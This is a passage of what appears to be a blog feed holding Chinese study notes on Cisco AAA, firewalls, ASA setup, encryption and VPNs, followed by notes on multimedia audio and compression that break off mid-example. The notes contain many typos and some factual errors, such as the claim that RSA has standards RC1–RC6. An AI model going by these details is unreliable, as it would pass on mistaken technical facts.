[method2...]</code></pre><p>此命令需要三个参数提供给路由器。第一个参数定义了认证的服务类型，可以在路由器上定义的服务类型如下表：</p><table><thead><tr><th>关键字</th><th>描述</th></tr></thead><tbody><tr><td>login</td><td>用来为所有基于ASCII的登录启用认证列表，如Telnet、SSH</td></tr><tr><td>enable</td><td>用来喂路由器的enable模式访问设置认证列表</td></tr><tr><td>ppp</td><td>用来为所有基于PPP的协议启用认证列表，如ISDN、远程拨入</td></tr><tr><td>arap</td><td>用来喂AppleTalk远程访问协议(ARAP)启用认证列表</td></tr></tbody></table><p>第二个参数是方法列表的名称。配置方法列表的目的是定义要执行AAA中的哪一个服务以及他们的执行顺序。方法列表有两种基本类型：命名的方法列表和默认方法列表。</p><p>第三个参数是用来<strong>认证的方法</strong>列表</p><table><thead><tr><th>关键字</th><th>描述</th></tr></thead><tbody><tr><td>enable</td><td>使用enable密码进行认证</td></tr><tr><td>local</td><td>使用本地用户名数据库进行认证</td></tr><tr><td>local-case</td><td>与local相同，但区分大小写的本地用户名认证</td></tr><tr><td>line</td><td>使用线路密码进行认证</td></tr><tr><td>group radius</td><td>使用所有RADIUS服务器列表进行认证</td></tr><tr><td>group tacacs+</td><td>使用所有TACACS+服务器列表进行认证</td></tr><tr><td>krb5</td><td>使用kerbero5进行认证</td></tr><tr><td>Krb5-telnet</td><td>当使用telnet连接路由器时，使用kerbero5 telnet认证协议</td></tr><tr><td>none</td><td>应用此方法时不使用认证</td></tr></tbody></table><h5 id="4⃣️应用认证方法列表"><a href="#4⃣️应用认证方法列表" class="headerlink" title="4⃣️应用认证方法列表"></a>4⃣️应用认证方法列表</h5><p>在配置好方法列表之后，就需要将该方法列表应用到路由器的接口或线路下。</p><pre><code>//以下命令用来在路由器上开启AAA服务并配置和RADIUS服务器之间的通信Router(config)#aaa new-modelRouter(config)#radius-server host 192.168.1.100Router(config)#radius-server key cisco!@#//以下命令用来配置一个名称为TELNET的方法列表，并把该列表应用到VTY线路模式下Router(config)#aaa authentication login TELNET group radiusRouter(config)#line vty 0 4Router(config-line)#login authentication TELNET Router(config-line)#exit</code></pre><h4 id="配置AAA授权"><a href="#配置AAA授权" class="headerlink" title="配置AAA授权"></a>配置AAA授权</h4><h5 id="1⃣️使用aaa-authorization命令集定义授权服务和授权方法列表"><a href="#1⃣️使用aaa-authorization命令集定义授权服务和授权方法列表" class="headerlink" title="1⃣️使用aaa authorization命令集定义授权服务和授权方法列表"></a>1⃣️使用aaa authorization命令集定义授权服务和授权方法列表</h5><pre><code>Router(config)#aaa authorization {network | exec | configuration | ...} {default | list-name} [method1] [method2...]</code></pre><p>在该命令中，需要选择的第一个参数是用于授权的服务类型</p><table><thead><tr><th>关键字</th><th>描述</th></tr></thead><tbody><tr><td>network</td><td>与网络连接（PPP、SLP、ARAP）进行授权</td></tr><tr><td>exec</td><td>为与授权模式终端会话(shell)相关联的寿星进行授权</td></tr><tr><td>commands</td><td>对特权模式下的命令进行授权。命令授权能够将所有特权命令授权和一个特定的特权级别进行关联</td></tr><tr><td>Config-commands</td><td>与上一条类似，用于授权配置模式下的命令</td></tr><tr><td>auth-proxy</td><td>通过应用特定的安全策略，来为特定用户授权认证代理服务器</td></tr><tr><td>configuration</td><td>从AAA服务器上更新配置文件</td></tr><tr><td>Reverse-access</td><td>反响Telnet会话</td></tr><tr><td>ipmobile</td><td>与移动IP服务进行授权</td></tr></tbody></table><p>第二个参数时方法列表的名称。和认证方法列表一样，授权方法列表有命名的方法列表和默认方法列表两种类型。</p><p>第三个参数是授权方法列表。在授权列表汇总每个方法都被尝试知道授权成功。</p><table><thead><tr><th>关键字</th><th>描述</th></tr></thead><tbody><tr><td>Group radius</td><td>使用RADIUS服务器列表进行授权。NAS设备向RADIUS服务器请求授权信息。RADIUS通过关联属性一值对来为正确的用户执行权限，这些属性一值对保存在RADIUS服务器的数据库中。</td></tr><tr><td>Group tacacs+</td><td>使用TACACS服务器列表进行授权。NAS设备向TACACS+服务器请求授权信息。TACACS+通过关联属性一值对来为正确的用户执行权限，这些属性一值对保存在TACACS+服务器的数据库中。</td></tr><tr><td>local</td><td>使用本地用户名数据库进行授权。本地数据库的功能和管理都很有限。</td></tr><tr><td>none</td><td>无需授权（总是成功）。路由器不请求授权信息，在此线路或接口上不执行授权</td></tr><tr><td>If-authenticatied</td><td>允许通过认证的用户去访问请求的功能</td></tr></tbody></table><h5 id="2⃣️应用授权方法列表"><a href="#2⃣️应用授权方法列表" class="headerlink" title="2⃣️应用授权方法列表"></a>2⃣️应用授权方法列表</h5><pre><code>Router(config)#aaa new-modelRouter(config)#radius-server host 10.1.1.100Router(config)#radius-server key cisco!@#Router(config)#aaa authentication ppp AUTHEN group radiusRouter(config)#aaa authorization network AUTHOR group radius if-authenticatedRouter(config)#int group-async 1Router(config-if)#ppp authentication chap AUTHENRouter(config-if)#ppp authorization AUTHORRouter(config-if)#exit</code></pre><h2 id="第六章-防火墙"><a href="#第六章-防火墙" class="headerlink" title="第六章 防火墙"></a>第六章 防火墙</h2><h3 id="1-防火墙的主要功能"><a href="#1-防火墙的主要功能" class="headerlink" title="1.防火墙的主要功能"></a>1.防火墙的主要功能</h3><h4 id="功能："><a href="#功能：" class="headerlink" title="功能："></a>功能：</h4><p>1⃣️网络安全的屏障</p><p>2⃣️强化网络安全策略</p><p>3⃣️对网络存取和访问进行检测审计</p><p>4⃣️防止内部信息的处理</p><p>5⃣️安全策略检查</p><p>6⃣️实施NAT的理想平台</p><p>实现基于内容的过滤、VPN、用户认证、包过滤和检测</p><h3 id="2-CBAC防火墙的定义，特点。"><a href="#2-CBAC防火墙的定义，特点。" class="headerlink" title="2.CBAC防火墙的定义，特点。"></a>2.CBAC防火墙的定义，特点。</h3><p>基于上下文的访问控制（Context-Based ACCess Control，CBAC）是一个基于软件的防火墙特性，它可以根据应用层协议的绘画信息智能地过滤TCP和UDP数据包。</p><h4 id="CBAC功能："><a href="#CBAC功能：" class="headerlink" title="CBAC功能："></a>CBAC功能：</h4><p>1⃣️流量过滤</p><p>2⃣️流量监测</p><p>3⃣️入侵检测</p><p>4⃣️产生审计和警告信息</p><h4 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h4><p>CBAC可以基于每个协议对数据包进行检测。只有指定的协议次啊会被CBAC检测，没有指定的那些协议则不受CBAC检测的影响，而是服从路由器傻姑娘其他进程的安排，如NAT、路由协议和ACL等。</p><p>假设内网用户发起外部链接，从被保护网络到外部网络，CBAC能够检测Telnet流量。同时，假设在外部接口上应用了ACL阻拦Telnet流量进入被保护网络。连接过程如下：</p><p>（1）由内网发起的刘阿玲到达路由器时，如果路由器上配置了入站方向的ACL，则先处理ACL。如果ACL拒绝这种类型的流量，则数据包被丢弃；如果ACL允许，则将检查CBAC规则。</p><p>（2）如果该Telnet流量不符合CBAC定义的规则，则CBAC将不检测该流量并允许其通过；否则，CBAC将检测该流量并与状态表中的条目比较。如果状态表中没有此连接，则添加新的条目；如果已经存在，则重置此连接的空闲计时器。</p><p>（3）如果添加了新的条目，则在外部接口的入站方向（从外部网络到内部网络）添加动态的ACL条目，这允许Telnet反悔的流量，即数据包属于之前同一Telnet连接的一部分可以返回网络。临时的开通会一直持续到会话结束。这些动态条目不会保存在NVRAM中。</p><p>（4）会话终止，状态表中的动态信息和动态ACL条目将被删除。</p><h3 id="3-dmz区域"><a href="#3-dmz区域" class="headerlink" title="3.dmz区域"></a>3.dmz区域</h3><p>非军事区（DMZ）它是为了解决安装<a href="https://baike.baidu.com/item/防火墙/52767" target="_blank" rel="noopener">防火墙</a>后外部网络的访问用户不能访问内部<a href="https://baike.baidu.com/item/网络服务器/99096" target="_blank" rel="noopener">网络服务器</a>的问题，而设立的一个非<a href="https://baike.baidu.com/item/安全系统/3131501" target="_blank" rel="noopener">安全系统</a>与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器<a href="https://baike.baidu.com/item/设施/3498084" target="_blank" rel="noopener">设施</a>，如企业Web服务器、<a href="https://baike.baidu.com/item/FTP服务器" target="_blank" rel="noopener">FTP服务器</a>和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部<a href="https://baike.baidu.com/item/网络/143243" target="_blank" rel="noopener">网络</a>。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p><h3 id="4-ASA防火墙特点、配置。"><a href="#4-ASA防火墙特点、配置。" class="headerlink" title="4.ASA防火墙特点、配置。"></a>4.ASA防火墙特点、配置。</h3><p>Cisco的自适应安全设备（ASA）是一个独立的防火墙设备，它不仅为用户提供防火墙、入侵防御和VPN等功能特性，而且还可以提供ASA虚拟化、容错的高可用性、身份防火墙、威胁控制和抑制访问。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><h5 id="1⃣️基本接口配置"><a href="#1⃣️基本接口配置" class="headerlink" title="1⃣️基本接口配置"></a>1⃣️基本接口配置</h5><p>要想使流量能够往返于接口之间，并能够双向通过防火墙，需要为它们配置一些基本的参数。这些参数包括接口名称、安全级别、IP地址和子网掩码、动态或静态的路由协议，并且要打开物理接口，因为它默认情况下使处于关闭状态。</p><pre><code>ciscoasa#configure terciscoasa(config)#int e0/0ciscoasa(config-if)#nameif insideciscoasa(config-if)#security-level 100ciscoasa(config-if)#ip add 10.1.1.1 255.255.255.0ciscoasa(config-if)#no shutdown</code></pre><p>2⃣️配置静态及默认路由</p><p>在对ASA安全设备进行初始化时，为其配置IP路由是最基本的步骤。ASA安全设备支持静态及默认路由、OSPF、EIGRP和RIP四种IP路由的实现方法。</p><pre><code>ciscoasa(config)#route interface_name network netmask gateway_ip [metric]</code></pre><pre><code>ciscoasa(config)#route outside 0.0.0.0 0.0.0.0 202.100.1.1ciscoasa(config)#route inside 192.168.1.0 255.255.255.0 10.1.2.1ciscoasa(config)#route dmz 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h2 id="第七章-信息加密"><a href="#第七章-信息加密" class="headerlink" title="第七章 信息加密"></a>第七章 信息加密</h2><h3 id="1-对称加密、非对称加密的定义。"><a href="#1-对称加密、非对称加密的定义。" class="headerlink" title="1.对称加密、非对称加密的定义。"></a>1.对称加密、非对称加密的定义。</h3><h4 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h4><p>对称加密算法也被称为私钥加密算法，它是用相同的密钥加密和解密，这意味着通信的双方必须都持有这个密钥。对称加密一般用于信息加密，以此来提供信息机密性保护。</p><h5 id="常见的对称加密算法："><a href="#常见的对称加密算法：" class="headerlink" title="常见的对称加密算法："></a>常见的对称加密算法：</h5><p>数据加密标准（DES）：DES是最早产生的也是最常见的一种对称加密算法，它是一个典型的分组加密算法，使用56比特的密钥来加密64比特的数据块。目前，DES算法加密的数据在24小时之内就可以破解，被认为是不安全的。</p><p>三重数据加密标准（3DES）：DES之所以不安全是因为它的密钥长度太短。而3DES把密钥长度增加到了168比特，是DES的三倍。</p><p>高加密标准（AES）：AES算法可以使用可变的数据块长度（128、192、256比特）和密钥长度（128、192、256比特）。在今天的加密环境中，AES的使用最为广泛，正在取代DES和3DES。</p><h4 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h4><p>非对称加密算法也称为公钥加密算法，使用一个密钥对（公钥/私钥对），一个用来加密明文，另一个用来解密密文。与对称加密算法不同的是，非对称加密算法不用为通信的双方共享一个密钥也可以实现在非安全通道上的安全通信。</p><h5 id="常见的非对称加密算法："><a href="#常见的非对称加密算法：" class="headerlink" title="常见的非对称加密算法："></a>常见的非对称加密算法：</h5><p>RSA：RSA是部署最广泛的非对称加密算法，多用于密钥交换、数字签名和信息加密。RSA有多种标准（RC1、RC2、RC3、RC4、RC5和RC6），每一种标准都是用变长的块长度和密钥长度。</p><p>数字签名算法（DSA）：DSA是1991年由NIST为数字签名标准提出的另一种非对称加密算法。</p><p>公钥加密标准（PKCS）：PKCS是一系列相互协作的公钥加密标准和指导方针，由RSA信息安全公司设计和发布。</p><h3 id="2-数字签名的定义"><a href="#2-数字签名的定义" class="headerlink" title="2.数字签名的定义"></a>2.数字签名的定义</h3><p>散列算法也叫做散列函数、HASH函数或信息摘要，主要用来验证数据的完整性，确保数据在传输过程中没有遭到篡改。</p><p>散列散发具有以下四个特点：</p><p>固定长度输出：散列函数可以接收人任意长度的信息，并输出固定长度的散列值。</p><p>雪崩效应：原始信息哪怕修改一个比特，计算得到的散列值就会发生巨大的变化。</p><p>单向：只能从原始信息计算得到散列值，不可能从散列值恢复原始信息。</p><p>避免冲突：不可能有不同的原始信息经过同一个散列函数计算出相同的散列值，即不同的输入值通过散列函数计算将得到不同的散列值。因此散列算法能够保证信息的不唯一性。</p><h3 id="3-D-H算法的作用"><a href="#3-D-H算法的作用" class="headerlink" title="3.D-H算法的作用"></a>3.D-H算法的作用</h3><h4 id="Diffie-Hellman算法"><a href="#Diffie-Hellman算法" class="headerlink" title="Diffie-Hellman算法"></a>Diffie-Hellman算法</h4><p>DH算法是大多数现代化自动密钥交换方法的基础，在网络化的今天是最常用的协议之一。DH算法不是一种加密机制，并不用于加密数据。它是公钥分发系统（也称为公钥交换协议），是一种通过不安全的通信通道为通信双方建立一个共享密钥的方法。</p><p>DH是一种数学算法，允许通信双方在两端系统上生成相同的共享密钥，不需要实现交互。通过DH算法生成的共享密钥不会在通信双方交换，通信双方可以使用这个共享密钥通过对称加密系统间的流量。</p><h2 id="第八章-VPN技术"><a href="#第八章-VPN技术" class="headerlink" title="第八章 VPN技术"></a>第八章 VPN技术</h2><h3 id="1-GRE-VPN"><a href="#1-GRE-VPN" class="headerlink" title="1.GRE VPN"></a>1.GRE VPN</h3><p>通用路由封装（GRE）协议是网络中通过隧道将通信从一个专用网络传输到另一个专用网络常用到的一个协议。</p><p>GRE是一种典型的三层隧道封装技术，能够将各种网络协议（IP协议与非IP协议）封装到IP隧道内。</p><h4 id="配置点到点的GRE隧道"><a href="#配置点到点的GRE隧道" class="headerlink" title="配置点到点的GRE隧道"></a>配置点到点的GRE隧道</h4><p>配置一条GRE隧道包括以下五个步骤：</p><p>（1）使用命令int tunnel创建一个隧道接口。</p><p>（2）为隧道接口分配一个IP地址。</p><p>（3）使用命令tunnel source标志源隧道接口。</p><p>（4）使用命令tunnel destination标志目的隧道接口</p><p>（5）使用命令tunnel mode gre配置GRE所要封装的协议。</p><pre><code>Router(config)#int tunnel 0Router(config-if)#ip add 171.16.1.1 255.255.255.0Router(config-if)#tunnel source 202.100.1.1Router(config-if)#tunnel destination 202.100.2.1Router(config-if)#tunnel mode gre ip Router(config-if)#exit</code></pre><h3 id="2-IPSec-VPN的两种封装格式"><a href="#2-IPSec-VPN的两种封装格式" class="headerlink" title="2.IPSec VPN的两种封装格式"></a>2.IPSec VPN的两种封装格式</h3><p>IPSec VPN是一项标准的安全技术，它通过一组加密协议来保护IP流量，从而保护IP网络上的所有应用和通信。IPSec不绑定任何具体的加密、认证、安全算法或密钥技术，它是开放标准的一个框架，阐明了安全通信的规则。IPSec依赖现存的算法来实现加密、认证和密钥交换。</p><p>IPSec框架主要包含以下五个组件：</p><p>（1）IPSec的封装协议，如ESP或AH。</p><p>（2）加密算法，如DES、3DES、AES或SEAL。可以根据所需要的安全等级进行选择。</p><p>（3）散列函数，如MD5或SHA。</p><p>（4）建立共享密钥的方法，有两种：预共享或使用RSA的数字特征。</p><p>（5）DH算法组。有四种DH密钥交换算法可以选择，包括DH Group1（DH1）、DH2、DH5和DH7，选择哪种类型的组取决于具体需求。</p><h4 id="两种封装格式："><a href="#两种封装格式：" class="headerlink" title="两种封装格式："></a>两种封装格式：</h4><p>ESP是基于IP协议，协议号为50。ESP用于实现机密性、完整性、身份验证，并提供反重放保护。</p><p>AH同样是基于IP的协议，协议号为51，AH只能够为数据提供完整性和源认证两方面的安全服务，并且低于重放攻击。AH并不能为数据提供私密性服务，也就是说不加密，所以在实现部署IPSec VPN的时候很少使用AH，绝大部分IPSec VPN都会使用ESP进行封装。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多媒体总结</title>
      <link href="/2020/09/06/duo-mei-ti-zong-jie/"/>
      <url>/2020/09/06/duo-mei-ti-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="网络多媒体"><a href="#网络多媒体" class="headerlink" title="网络多媒体"></a>网络多媒体</h1><h2 id="第一部分：基础级"><a href="#第一部分：基础级" class="headerlink" title="第一部分：基础级"></a>第一部分：基础级</h2><h3 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><h4 id="1-媒体的类型："><a href="#1-媒体的类型：" class="headerlink" title="1.媒体的类型："></a>1.媒体的类型：</h4><p>感觉媒体：感觉媒体是指直接作用于人们的感觉器官，从而能使人产生直接感觉的媒体。感觉媒体包括人类的语言、音乐和自然界的各种声音、活动图像、图形、动画及文本等。</p><p>表示媒体：表示媒体是指为了传输感觉媒体而人为研究出来的媒体。借助于此种媒体，便能更有效的存储或传输感觉媒体。如语言编码、电报码等。</p><p>存储媒体：存储媒体是指用于存储表示媒体的物理介质。如纸张、磁带、磁盘、光盘等。</p><p>显示媒体：显示媒体是指用于通信中使电信号和感觉媒体之间产生转换用的媒体。如输入、输出设施，键盘、鼠标、显示器、打印机等。</p><p>传输媒体：传输媒体是指用于传输表示媒体的物理介质。传输媒体的种类很多，如电话线、双绞线、同轴电缆、光纤、无线电和红外线等。</p><h4 id="2-多媒体的基本特征"><a href="#2-多媒体的基本特征" class="headerlink" title="2.多媒体的基本特征"></a>2.多媒体的基本特征</h4><p>多样性、交互性、集成性、实时性。</p><h4 id="3-多媒体计算机系统的层次结构"><a href="#3-多媒体计算机系统的层次结构" class="headerlink" title="3.多媒体计算机系统的层次结构"></a>3.多媒体计算机系统的层次结构</h4><p>第一层：硬件系统，包含多媒体外部设备及计算机硬件</p><p>第二层：软件系统，包括多媒体文件系统、操作系统、通信软件；</p><p>第三层：应用程序接口，包含多媒体应用程序接口；</p><p>第四层：著作工具及软件，包含图形处理、图像处理、音频处理、视频处理；</p><p>第五层：应用系统，多媒体应用作品，如游戏、数字电影、教育课件、模拟器等。</p><p>使用Authorware 开发的《多媒体技术》课件属于多媒体创作工具</p><p>多媒体工具应具备将不同媒体信息编入程序的能力、时间控制能力、调试能力、动态文输入和输出的能力等。</p><h4 id="4-流媒体技术应用"><a href="#4-流媒体技术应用" class="headerlink" title="4.流媒体技术应用"></a>4.流媒体技术应用</h4><p>远程教学；在线学习；网上培训、教学；娱乐休闲。</p><h4 id="5-常见的视频制式特点"><a href="#5-常见的视频制式特点" class="headerlink" title="5.常见的视频制式特点"></a>5.常见的视频制式特点</h4><p>1.AVI视频格式：优点是图像质量好，可以跨多个平台使用，但是其缺点是体积过于庞大，并且更加糟糕的事压缩标准不统一。</p><p>2.MPEG视频格式：家里常看的VCD、SVCD、DVD就是这种格式。这种视频格式的文件扩展名包括：.mpg、.mlv、.mpe、.mpeg及VCD光盘中的.dat文件等。MPEG格式目前有三种压缩格式：MPEG-1、MPEG-2、MPEG-4。</p><p>3.RMVB视频格式：这是一种由RM视频格式升级延伸出的新视频格式，他的先进之处在于RMVB视频格式打破了原先RM格式那种平均压缩采样的方式，在保证平均压缩比的基础上合理利用比特率资源，就是说静止和动作场面少的画面场景采用较低的编码速率，这样可以留出更多的宽带空间，而这些宽带会在出现快速运动的画面场景时被利用。</p><p>4.FLV视频格式：它形成的文件极小、加载速度极快，丰富多样的资源</p><p>5.MOV视频格式：是由美国的苹果公司开发的，默认的播放器是苹果的QuickTime Player具有较高的压缩比率和较完美的视频清晰度，最大的特点是跨平台，不仅是mac系统可以使用，而且windows系统同样可以使用。</p><p>6.ASF视频格式：由微软公司推出的高级流格式，也是一个在Internet上实施传播多媒体的技术标准。优点包括本地或网络回放、可扩充的媒体类型、部件下载、以及扩展性等。</p><p>7.DivX视频格式：是由MPEG-4衍生出的另一种视频编码（压缩）标准，也就是我们通常所说的DVDrip格式，这种编码对机器的要求也不高，所以DivX视频编码技术可以说是一种对DVD造成威胁最大的新生视频压缩格式。</p><p>8.DV-AV1视频格式：是由索尼、松下、JVC等多家厂商联合提出的一种家用数字视频格式。目前非常流行的数码相机就是使用这种格式记录视频数据的。</p><p>9.WMV视频格式：是微软推出的一种采用独立编码方式并且可以直接在网上实时观看视频节目的文件压缩格式。优点包括：本地或网络回放、可扩充的媒体类型、部件下载、可伸缩的媒体类型、流的优先级化、多语言支持、环境独立性、丰富的流间关系以及扩展性等。</p><p>10.MKV视频格式：是民间流行的一种视频格式，以它兼容众多视频编码见长，可以是DivX、XviD、RealVideo、H264、MPEG2、VC1等等。但是由于是民间格式，没有版权显示，又易于播放，所以官方发布的视频影片都不采用mkv，网上制作下载常见。</p><p>11.TS视频格式：是高清专用封装容器。多见于原版的蓝光，HDDVD转换的视频影片，一般采用H254，VC1等最新的视频编码。</p><p>12.VCD视频格式</p><h3 id="二、声音信息的数字化"><a href="#二、声音信息的数字化" class="headerlink" title="二、声音信息的数字化"></a>二、声音信息的数字化</h3><h4 id="1-模拟音频的特征——声音三要素、可听音域范围"><a href="#1-模拟音频的特征——声音三要素、可听音域范围" class="headerlink" title="1.模拟音频的特征——声音三要素、可听音域范围"></a>1.模拟音频的特征——声音三要素、可听音域范围</h4><h4 id="2-声音数字化过程三步骤——采样、量化、编码；"><a href="#2-声音数字化过程三步骤——采样、量化、编码；" class="headerlink" title="2.声音数字化过程三步骤——采样、量化、编码；"></a>2.声音数字化过程三步骤——采样、量化、编码；</h4><p>声音数字化三要素：</p><table><thead><tr><th>采样频率</th><th>量化位数</th><th>声道数</th></tr></thead><tbody><tr><td>每秒钟抽取声波幅度样本的次数</td><td>每个采样点用多少二进制位表示数据范围</td><td>使用声音通道的个数</td></tr><tr><td>采样频率越高，声音质量越好，数据量也越大</td><td>量化位数越多，音质越好，数据量也越大</td><td>立体声比单声道的表现力丰富，但数据量翻倍</td></tr><tr><td>11.925KHz<br>22.05kHz<br>44.1kHz</td><td>8位=256个值<br>16位=65536个值</td><td>单声道<br>立体声</td></tr></tbody></table><p>采样就是找点、量化就会死找值</p><p>采样是第一步，之后才能做量化</p><p>A/D和D/A转换器：模拟信号和数字信号可以互相转换</p><p>采样-&gt;A/D-&gt;编码-&gt;压缩-&gt;传输-&gt;D/A（低通滤波器）</p><p>奈奎斯特理论：只有采样频率高于声音信号最高频率的两倍时，才能把数字信号表示的声音还原称为原来的声音。</p><p>存储的先后顺序：编码-&gt;压缩-&gt;解码-&gt;存储</p><p>数据压缩是指按照一定的算法，将冗余的数据转换成一种相对节省空间的数据表达格式，便于信息的保存和传输，压缩后的信息必须通过解压缩才能恢复。</p><p>数据的压缩处理实际包括数据的压缩和解压过程，压缩是编码过程，解压是解码过程。</p><h5 id="多媒体数据压缩的分类"><a href="#多媒体数据压缩的分类" class="headerlink" title="多媒体数据压缩的分类"></a>多媒体数据压缩的分类</h5><h6 id="1-冗余压缩法：也称无损压缩或无失真压缩"><a href="#1-冗余压缩法：也称无损压缩或无失真压缩" class="headerlink" title="1.冗余压缩法：也称无损压缩或无失真压缩"></a>1.冗余压缩法：也称无损压缩或无失真压缩</h6><p>为保留原始多媒体对象（包括图像、语音和视频）而设计的。</p><h6 id="2-有损压缩：也称有失真压缩"><a href="#2-有损压缩：也称有失真压缩" class="headerlink" title="2.有损压缩：也称有失真压缩"></a>2.有损压缩：也称有失真压缩</h6><p>有损压缩技术主要的应用领域是在影像节目、可视电话会议和多媒体网络这样的由音频、彩色图像和视频组成的多媒体应用中，并且得到了广泛的应用。</p><h6 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h6><p>无损压缩-&gt;统计编码：行程编码、哈夫曼编码、算术编码、香农编码、LZW编码</p><p>有损压缩-&gt;PCM编码</p><p>​                -&gt;预测编码：DPCM编码、ADPCM编码、帧间预测编码</p><p>​                -&gt;变换编码：离散余弦变换、K-L变换、小波变换</p><p>​                -&gt;混合编码：JPEG、MPEG、H.261</p><h4 id="3-数字音频质量的评定标准"><a href="#3-数字音频质量的评定标准" class="headerlink" title="3.数字音频质量的评定标准"></a>3.数字音频质量的评定标准</h4><p>等级由高到低的顺序是：DAT、CD、FM、AM 和数字电话</p><table><thead><tr><th>音频质量</th><th>采样频率kHz</th><th>采样精度bit</th><th>声道形式</th><th>数码率kbps</th><th>频带Hz</th></tr></thead><tbody><tr><td>DAT</td><td>48</td><td>16</td><td>立体声</td><td>1536</td><td>20～20000</td></tr><tr><td>CD</td><td>44.1</td><td>16</td><td>立体声</td><td>1411.2</td><td>20～20000</td></tr><tr><td>FM</td><td>22.05</td><td>16</td><td>立体声</td><td>705.6</td><td>20～15000</td></tr><tr><td>AM</td><td>11.025</td><td>8</td><td>单声道</td><td>88.2</td><td>50～7000</td></tr><tr><td>电话</td><td>8</td><td>8</td><td>单声道</td><td>64</td><td>200～3400</td></tr></tbody></table><p>例如：为何 CD 音质要比电话音质好？</p><p>① 考虑采样频率的高低。 </p><p>CD 音质的采样频率是 44.1KHz，电话音质的采样频率只有 8KHz，CD 音质能还原出更多的声音。</p><p>② 频带范围覆盖不同。</p><p>CD 音质的频带范围是 10<del>20Khz，能表现人耳可听阈的所有声音；电话音质的频带范围是 200</del>3400K，仅能表现人声范围的有效声音</p><h4 id="4-数字音频数据量的计算——注意单位的转换（使用KB或MB）"><a href="#4-数字音频数据量的计算——注意单位的转换（使用KB或MB）" class="headerlink" title="4.数字音频数据量的计算——注意单位的转换（使用KB或MB）"></a>4.数字音频数据量的计算——注意单位的转换（使用KB或MB）</h4><p>可先算出比特率，再计算数据量</p><p>数据量：v=f*b*s/8</p><p>f：采样频率；b：数据位数；s：声道数。</p><p><strong>电话音质用KB；CD音质用MB</strong></p><p>例如：4 分钟的 CD 音乐的数据量计算：v=fbs/8</p><p>44100Hz/秒 * 2B(16b)/样 * 2 声道 * 60 秒 * 4 分钟 = 40.37MB</p><h3 id="三、数据压缩技术"><a href="#三、数据压缩技术" class="headerlink" title="三、数据压缩技术"></a>三、数据压缩技术</h3><h4 id="1-冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵"><a href="#1-冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵" class="headerlink" title="1.冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵"></a>1.冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵</h4><p>数据压缩编码的可能性——冗余数据</p><p>空间冗余——空间连贯性</p><p>时间冗余——相邻帧的相关性</p><p>结构冗余——图形结构的重复性</p><p>只是冗余——先验知识</p><p>视觉冗余——敏感度（视觉阈值）</p><p>信息熵冗余——信源编码本身包含数据的冗余</p><h4 id="2-数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度"><a href="#2-数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度" class="headerlink" title="2.数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度"></a>2.数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度</h4><h4 id="3-熵的定义——平均不确定的度量值"><a href="#3-熵的定义——平均不确定的度量值" class="headerlink" title="3.熵的定义——平均不确定的度量值"></a>3.熵的定义——平均不确定的度量值</h4><p>信息量：不确定的量度，信息量=数据量-冗余量</p><p>熵是信息量的度量方式，含义是信源S发出任意一个随机变量的平均信息量。</p><p>概率越小的事件包含的信息量越大。</p><h4 id="4-熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值"><a href="#4-熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值" class="headerlink" title="4.熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值"></a>4.熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值</h4><h4 id="5-行程编码（游程编码）"><a href="#5-行程编码（游程编码）" class="headerlink" title="5.行程编码（游程编码）"></a><strong>5.行程编码（游程编码）</strong></h4><p>基本思想：数据项d在输入流中连续出现n次，则以单个字符对nd替换n次出现者。</p><p>例如，字符串AAABCDDDDDDDDBBBBB，使用游程编码完成压缩，请计算压缩比。</p><p>字符串可表示为：(3)ABC(8)D(5)B，假设行程长度用1字节存储，则占用2+1+1+2+2=8B，原字符串长度为18B，即压缩比为18:8=2.25:1</p><h4 id="6-算术编码的压缩与解码流程"><a href="#6-算术编码的压缩与解码流程" class="headerlink" title="6.算术编码的压缩与解码流程"></a>6.算术编码的压缩与解码流程</h4><p>算术编码原理：将编码的信息表示成实数0和1之间的一个间隔[0,1)，信息越长，编码间隔就越小，表示这一间隔所需的二进制位数就越长。</p><p>例：A，B，C    PA=0.4，PB=0.5，PC=0.1</p><p>BBBC</p><p>1、将[0,1)分为[0,0,4)，[0.4,0.9)，[0.9,1)</p><p>2、第一个字符为B，将[0,1)缩小为[0.4,0.9)</p><p>0.9-0.4=0.5</p><p>0.5*0.4=0.2    0.5*0.5=0.25    0.5*0.1=0.05</p><p>[0.4,0.9)分为[0.4,0.6)    [0.6,0.85)    [0.85,0.9)</p><p>3、第二个字符仍为B，将[0.4,0.9)缩小为[0.6,0.85)</p><p>得[0.6,0.7)    [0.7,0.825)    